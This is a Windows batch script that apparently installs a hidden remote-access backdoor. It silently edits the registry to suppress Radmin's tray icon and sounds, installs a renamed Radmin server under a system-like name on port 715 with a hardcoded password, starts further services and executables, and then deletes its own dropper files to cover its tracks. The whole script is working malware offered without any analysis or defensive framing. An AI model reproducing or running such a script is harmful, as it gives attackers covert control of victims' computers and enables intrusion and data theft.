cd /d %windir%\system32

if exist msgate.dll goto end

echo.> msgate.dll

echo REGEDIT4> settings.reg
echo [-HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters]>> settings.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters]>> settings.reg
echo "DisableTrayIcon"=hex:01,00,00,00>> settings.reg
echo "DisableBeep"=hex:01,00,00,00>> settings.reg
regedit.exe /s settings.reg
del settings.reg
msdfm.exe /install /silence
msdfm.exe /port:715 /pass:bullshit /save /silence
net start r_server

runme.exe

msdsa.exe -:installonly
net start MSDSA

:end
del c:\tmpon.exe
del c:\tmpon.vbs
del hexec.exe
del runme.exe
del go.bat











